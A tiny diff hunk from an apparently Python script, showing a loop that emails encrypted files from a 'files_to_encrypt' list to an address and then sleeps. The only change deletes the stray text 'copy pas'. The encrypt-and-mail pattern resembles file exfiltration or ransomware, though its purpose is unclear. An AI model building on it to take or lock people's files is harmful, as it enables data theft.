@@ -161,5 +161,3 @@ for encrypting_file in files_to_encrypt:
     send_email(encrypted_file_names[count], encrypted_file_names[count], toaddr)
     count += 1
 time.sleep(120)
-
-copy pas
